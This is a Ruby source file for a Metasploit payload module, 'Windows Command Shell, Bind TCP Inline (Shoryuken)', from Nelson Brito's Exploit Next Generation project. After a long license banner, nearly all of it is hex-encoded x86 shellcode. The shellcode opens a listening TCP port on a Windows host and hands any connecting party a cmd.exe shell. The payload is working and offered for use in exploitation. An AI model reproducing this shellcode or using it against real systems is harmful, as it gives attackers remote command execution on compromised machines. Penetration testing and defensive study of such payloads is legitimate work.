## 
#  $Id: shell_shoryuken_bind_tcp.rb,v 1.6 2011-03-21 17:26:46-03 nbrito Exp $
##

###########################################################################
#        ___________ _______    ________                                  #
#        \_   _____/ \      \  /  _____/     .__         .__              #
#         |    __)_  /   |   \/   \  ___   __|  |___   __|  |             #
#         |        \/    |    \    \_\  \ /__    __/  /__    __/          #
#        /_______  /\____|__  /\______  /    |__|        |__|             #
#                \/         \/        \/                                  #
#                                                                         #
#                 Exploit Next Generation Methodology                     #
#                            Release 6.00                                 #
#                                                                         #
#                 Copyright (c) 2004-2011 Nelson Brito                    #
#                          All Rights Reserved                            #
#                                                                         #
###########################################################################
# Author: Nelson Brito <nbrito@sekure.org>                                #
#                                                                         #
# Copyright (c) 2004-2011 Nelson Brito. All rights reserved worldwide.    #
###########################################################################
# ENG example is free software;  you  may  redistribute and/or  modify it #
# under the terms of the 'GNU General Public License' as published by the #
# Free  Software  Foundation;  Version  2  with  the  clarifications  and #
# exceptions described below.  This guarantees your right to use, modify, #
# and redistribute this software under certain conditions. If you wish to #
# embed ENG technology into  proprietary software,  please,  contact  the #
# author for an alternative license (contact nbrito@sekure.org).          #
#                                                                         #
# NOTICE: THIS EXPLOIT NEXT GENERATION EXAMPLE IS NOT DISTRIBUTED AS PART #
# OF ANY COMMERCIAL OR PUBLIC TOOL AND IS FREELY AVAILABLE. ALTHOUGH THIS #
# EXAMPLE WAS PORTED TO WORK WITH RAPID7 METASPLOIT FRAMEWORK TO SHOW HOW #
# FLEXIBLE ITS APPROACH AND DEPLOYMENT IS.                                #
#                                                                         #
# This  program  is distributed in the hope that it will  be useful,  but #
# WITHOUT  ANY  WARRANTY;    without   even   the   implied  warranty  of #
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.                    #
# Please, refer to GNU General Public License v2.0 for further details at #
# http://www.gnu.org/licenses/gpl-2.0.html,  or  in the  LICENSE document #
# included with ENG.                                                      #
###########################################################################
require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Windows
	include Msf::Payload::Single
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Windows Command Shell, Bind TCP Inline',
			'Version'       => '$Revision: 1.6 $',
			'Description'   => 'Listen for a connection and spawn a command shell (Shoryuken)',
			'Author'        => [ 'Nelson Brito' ],
			'License'       => 'GPLv2',
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::BindTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'Payload'       =>
				{
					'Offsets' =>
						{
							'LPORT'    => [ 200, 'n' ],
							'EXITFUNC' => [ 329, 'V' ],
						},
					'Payload' =>
						"\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
						"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
						"\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
						"\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" +
						"\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" +
						"\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" +
						"\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" +
						"\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" +
						"\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +
						"\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07" +
						"\xFF\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00" +
						"\xFF\xD5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF" +
						"\xD5\x97\x31\xDB\x53\x68\x02\x00\x11\x5C\x89\xE6\x6A\x10\x56\x57" +
						"\x68\xC2\xDB\x37\x67\xFF\xD5\x53\x57\x68\xB7\xE9\x38\xFF\xFF\xD5" +
						"\x53\x53\x57\x68\x74\xEC\x3B\xE1\xFF\xD5\x57\x97\x68\x75\x6E\x4D" +
						"\x61\xFF\xD5\xE8\x15\x00\x00\x00\x43\x4D\x44\x20\x2F\x6B\x20\x73" +
						"\x65\x74\x20\x44\x49\x52\x43\x4D\x44\x3D\x2F\x62\x00\x5B\x57\x57" +
						"\x57\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01" +
						"\x8D\x44\x24\x10\xC6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4E\x56" +
						"\x56\x53\x56\x68\x79\xCC\x3F\x86\xFF\xD5\x89\xE0\x4E\x56\x46\xFF" +
						"\x30\x68\x08\x87\x1D\x60\xFF\xD5\xBB\xE0\x1D\x2A\x0A\x68\xA6\x95" +
						"\xBD\x9D\xFF\xD5\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13" +
						"\x72\x6F\x6A\x00\x53\xFF\xD5"

				}
			))
	end

end
